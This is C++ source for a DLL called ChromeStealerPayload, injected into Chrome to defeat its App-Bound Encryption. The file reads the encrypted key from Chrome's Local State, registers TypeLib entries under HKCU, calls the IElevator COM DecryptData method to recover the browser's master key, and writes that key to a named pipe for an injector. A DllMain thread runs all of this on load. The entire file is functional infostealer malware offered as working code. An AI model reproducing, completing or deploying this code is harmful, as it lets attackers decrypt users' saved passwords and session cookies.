// ChromeStealerPayload.dll - runs inside Chrome process, calls IElevator::DecryptData
// to obtain the app-bound key and sends it via named pipe (ABE bypass per xaitax research).

#include <Windows.h>
#include <Shlobj.h>
#include <comdef.h>
#include <string>
#include <fstream>
#include <vector>

// Chrome IElevator COM - CLSID and IID from Chromium elevation_service
// https://chromium.googlesource.com/chromium/src/+/master/chrome/elevation_service/
static const CLSID CLSID_ChromeElevator = {
    0x708860E0, 0xF641, 0x4611, { 0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B }
};
static const IID IID_IElevator = {
    0x463ABECF, 0x410D, 0x407F, { 0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8 }
};

// IElevator::DecryptData(ciphertext_bstr, &plaintext_bstr, &last_error)
MIDL_INTERFACE("463ABECF-410D-407F-8AF5-0DF35A005CC8")
IElevator : public IUnknown {
public:
    virtual HRESULT STDMETHODCALLTYPE RunRecoveryCRXElevated(
        const WCHAR* crx_path, const WCHAR* browser_appid,
        const WCHAR* origin_url, DWORD* last_error) = 0;
    virtual HRESULT STDMETHODCALLTYPE EncryptData(
        DWORD protection_level, const BSTR plaintext,
        BSTR* ciphertext, DWORD* last_error) = 0;
    virtual HRESULT STDMETHODCALLTYPE DecryptData(
        const BSTR ciphertext, BSTR* plaintext, DWORD* last_error) = 0;
};

#pragma comment(lib, "Crypt32.lib")

static std::string Base64Decode(const std::string& in) {
    // Decodes a Base64-encoded string into raw bytes using CryptStringToBinaryA.
    // @param in Base64-encoded input string.
    // @return Raw bytes as std::string (may contain nulls). Empty string on failure.
    DWORD len = 0;
    if (!CryptStringToBinaryA(in.c_str(), (DWORD)in.size(), CRYPT_STRING_BASE64, NULL, &len, NULL, NULL))
        return "";
    std::vector<BYTE> buf(len);
    if (!CryptStringToBinaryA(in.c_str(), (DWORD)in.size(), CRYPT_STRING_BASE64, buf.data(), &len, NULL, NULL))
        return "";
    return std::string((char*)buf.data(), len);
}

// Minimal JSON value extraction: find "app_bound_encrypted_key" and return string value
static std::string ExtractAppBoundKeyFromLocalState(const std::wstring& path) {
    // Reads Local State JSON file and extracts the value of "app_bound_encrypted_key".
    // @param path Full path to Local State file.
    // @return Base64 string value of app_bound_encrypted_key or empty on failure.
    std::ifstream f(path);
    if (!f) return "";
    std::string content((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
    f.close();
    const char* key = "\"app_bound_encrypted_key\"";
    size_t pos = content.find(key);
    if (pos == std::string::npos) return "";
    pos = content.find(':', pos);
    if (pos == std::string::npos) return "";
    pos = content.find('"', pos);
    if (pos == std::string::npos) return "";
    pos++;
    size_t end = content.find('"', pos);
    if (end == std::string::npos) return "";
    return content.substr(pos, end - pos);
}

static std::wstring ReadPipeNameFromConfig() {
    // Reads named pipe identifier from a temp file created by the injector process.
    // @return Wide string pipe name read from temp file or empty if not found.
    WCHAR path[MAX_PATH];
    if (GetTempPathW(MAX_PATH, path) == 0)
        return L"";
    wcscat_s(path, L"cs_abe_pipe.txt");
    std::ifstream f(path);
    if (!f) return L"";
    std::string line;
    if (!std::getline(f, line) || line.empty()) return L"";
    std::wstring result(line.begin(), line.end());
    return result;
}

static std::wstring TrimQuotes(const std::wstring& s) {
    // Removes leading/trailing single or double quotes from a string if present.
    // @param s Input wide string that may have quotes.
    // @return String without surrounding quotes if present; original otherwise.
    if (s.size() >= 2 && ((s.front() == L'\"' && s.back() == L'\"') || (s.front() == L'\'' && s.back() == L'\'')))
        return s.substr(1, s.size() - 2);
    return s;
}

static std::wstring GetElevationServiceName() {
    // Retrieves the COM LocalService name for Chrome Elevation Service from AppID registry.
    // @return Service name (defaults to "GoogleChromeElevationService" if not present).
    HKEY hKey = NULL;
    std::wstring name;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"Software\\Classes\\AppID\\{708860E0-F641-4611-8895-7D867DD3675B}", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        WCHAR buf[256]; DWORD cb = sizeof(buf), type = 0;
        if (RegQueryValueExW(hKey, L"LocalService", NULL, &type, (LPBYTE)buf, &cb) == ERROR_SUCCESS && type == REG_SZ)
            name = buf;
        RegCloseKey(hKey);
    }
    if (name.empty()) name = L"GoogleChromeElevationService";
    return name;
}

static std::wstring GetElevationServicePath() {
    // Resolves the ImagePath for the Elevation Service (expanding environment variables and trimming quotes).
    // @return Full executable path for Elevation Service or empty if not found.
    std::wstring svc = GetElevationServiceName();
    std::wstring keyPath = L"SYSTEM\\CurrentControlSet\\Services\\" + svc;
    HKEY hKey = NULL; std::wstring path;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, keyPath.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        DWORD type = 0; WCHAR buf[1024]; DWORD cb = sizeof(buf);
        if (RegQueryValueExW(hKey, L"ImagePath", NULL, &type, (LPBYTE)buf, &cb) == ERROR_SUCCESS) {
            std::wstring p = buf;
            WCHAR expanded[1024];
            if (type == REG_EXPAND_SZ) {
                if (ExpandEnvironmentStringsW(p.c_str(), expanded, 1024)) p = expanded;
            }
            path = TrimQuotes(p);
        }
        RegCloseKey(hKey);
    }
    return path;
}

static bool EnsureTypeLibHKCU(const std::wstring& exePath) {
    // Writes TypeLib paths for IElevator interface into HKCU so COM can load the library from the current Chrome version.
    // @param exePath Path to elevation_service executable used as TypeLib provider.
    // @return True if registry updates succeeded for both win32 and win64 keys.
    HKEY hKey = NULL; LONG r;
    r = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Classes\\TypeLib\\{463ABECF-410D-407F-8AF5-0DF35A005CC8}\\1.0\\0\\win32", 0, NULL, 0, KEY_SET_VALUE, NULL, &hKey, NULL);
    if (r != ERROR_SUCCESS) return false;
    RegSetValueExW(hKey, NULL, 0, REG_SZ, (const BYTE*)exePath.c_str(), (DWORD)((exePath.size()+1)*sizeof(wchar_t)));
    RegCloseKey(hKey);
    r = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Classes\\TypeLib\\{463ABECF-410D-407F-8AF5-0DF35A005CC8}\\1.0\\0\\win64", 0, NULL, 0, KEY_SET_VALUE, NULL, &hKey, NULL);
    if (r != ERROR_SUCCESS) return false;
    RegSetValueExW(hKey, NULL, 0, REG_SZ, (const BYTE*)exePath.c_str(), (DWORD)((exePath.size()+1)*sizeof(wchar_t)));
    RegCloseKey(hKey);
    return true;
}

static void Log(const wchar_t* msg) {
    // Writes a single UTF-8 line into cs_payload_log.txt when CHROME_STEALER_LOG is set.
    // @param msg UTF-16 message to append to the payload log file.
    WCHAR env[2] = { 0 };
    if (GetEnvironmentVariableW(L"CHROME_STEALER_LOG", env, 2) == 0) return;
    WCHAR path[MAX_PATH];
    if (GetTempPathW(MAX_PATH, path) == 0) return;
    wcscat_s(path, L"cs_payload_log.txt");
    HANDLE h = CreateFileW(path, GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return;
    SetFilePointer(h, 0, NULL, FILE_END);
    int wlen = (int)wcslen(msg);
    int need = WideCharToMultiByte(CP_UTF8, 0, msg, wlen, NULL, 0, NULL, NULL);
    if (need <= 0) { CloseHandle(h); return; }
    std::vector<char> buf(need + 2);
    WideCharToMultiByte(CP_UTF8, 0, msg, wlen, buf.data(), need, NULL, NULL);
    buf[need] = '\r';
    buf[need + 1] = '\n';
    DWORD written = 0;
    WriteFile(h, buf.data(), (DWORD)buf.size(), &written, NULL);
    CloseHandle(h);
}

static void WorkerThread(HMODULE hMod) {
    // Main payload entry: reads config, resolves Elevation Service TypeLib, calls IElevator::DecryptData and sends key via pipe.
    // @param hMod Current module handle; used to exit thread via FreeLibraryAndExitThread.
    std::wstring pipeName = ReadPipeNameFromConfig();
    if (pipeName.empty())
        pipeName = L"\\\\.\\pipe\\ChromeStealerKey";
    Log(L"Payload start");
    Log((L"Pipe: " + pipeName).c_str());
    std::wstring svcPath = GetElevationServicePath();
    if (!svcPath.empty()) {
        if (EnsureTypeLibHKCU(svcPath)) Log(L"TypeLib HKCU updated"); else Log(L"TypeLib HKCU update failed");
    } else {
        Log(L"Elevation service path not found");
    }

    WCHAR configPath[MAX_PATH];
    if (FAILED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, configPath))) {
        Log(L"SHGetFolderPathW failed");
        FreeLibraryAndExitThread(hMod, 1);
        return;
    }
    wcscat_s(configPath, L"\\Google\\Chrome\\User Data\\Local State");

    std::wstring localStatePath(configPath);
    Log((L"LocalState: " + localStatePath).c_str());
    std::string keyB64 = ExtractAppBoundKeyFromLocalState(localStatePath);
    if (keyB64.empty()) {
        Log(L"app_bound_encrypted_key not found");
        FreeLibraryAndExitThread(hMod, 2);
        return;
    }

    std::string raw = Base64Decode(keyB64);
    if (raw.size() < 4 || raw.substr(0, 4) != "APPB") {
        Log(L"APPB prefix missing");
        FreeLibraryAndExitThread(hMod, 3);
        return;
    }
    raw = raw.substr(4);
 
    BSTR ciphertextBstr = SysAllocStringByteLen(raw.c_str(), (UINT)raw.size());
    if (!ciphertextBstr) {
        Log(L"SysAllocStringByteLen failed");
        FreeLibraryAndExitThread(hMod, 4);
        return;
    }

    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (FAILED(hr)) {
        Log(L"CoInitializeEx failed");
        SysFreeString(ciphertextBstr);
        FreeLibraryAndExitThread(hMod, 5);
        return;
    }
    CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);

    IElevator* pElevator = NULL;
    hr = CoCreateInstance(CLSID_ChromeElevator, NULL, CLSCTX_LOCAL_SERVER, IID_IElevator, (void**)&pElevator);
    if (FAILED(hr) || !pElevator) {
        WCHAR msg[128];
        swprintf_s(msg, L"CoCreateInstance ChromeElevator failed. HRESULT: 0x%08X", hr);
        Log(msg);
        SysFreeString(ciphertextBstr);
        CoUninitialize();
        FreeLibraryAndExitThread(hMod, 6);
        return;
    }

    BSTR plaintextBstr = NULL;
    DWORD lastError = 0;
    hr = pElevator->DecryptData(ciphertextBstr, &plaintextBstr, &lastError);
    {
        WCHAR msg[256];
        if (FAILED(hr)) {
            swprintf_s(msg, L"DecryptData failed. HRESULT=0x%08X LastError=%lu", hr, lastError);
        } else {
            swprintf_s(msg, L"DecryptData succeeded. HRESULT=0x%08X", hr);
        }
        Log(msg);
    }
    SysFreeString(ciphertextBstr);
    pElevator->Release();

    if (FAILED(hr) || !plaintextBstr) {
        Log(L"No plaintext from DecryptData");
        CoUninitialize();
        FreeLibraryAndExitThread(hMod, 7);
        return;
    }

    UINT keyLen = SysStringByteLen(plaintextBstr);
    const char* keyBytes = (const char*)plaintextBstr;
    if (keyLen > 32) keyLen = 32;
    Log(L"Got key from DecryptData");

    HANDLE hPipe = CreateFileW(pipeName.c_str(), GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hPipe != INVALID_HANDLE_VALUE) {
        DWORD written;
        WriteFile(hPipe, keyBytes, keyLen, &written, NULL);
        Log(L"Key written to pipe");
        CloseHandle(hPipe);
    }
    else {
        Log(L"CreateFile to pipe failed");
    }

    SysFreeString(plaintextBstr);
    CoUninitialize();
    Log(L"Payload exit");
    FreeLibraryAndExitThread(hMod, 0);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    // DLL entry: starts WorkerThread on process attach and returns immediately.
    // @param hModule Current module handle.
    // @param reason Attach/detach reason code.
    // @param lpReserved Reserved parameter.
    // @return TRUE to indicate successful load/unload handling.
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkerThread, hModule, 0, NULL);
        if (hThread) CloseHandle(hThread);
    }
    return TRUE;
}
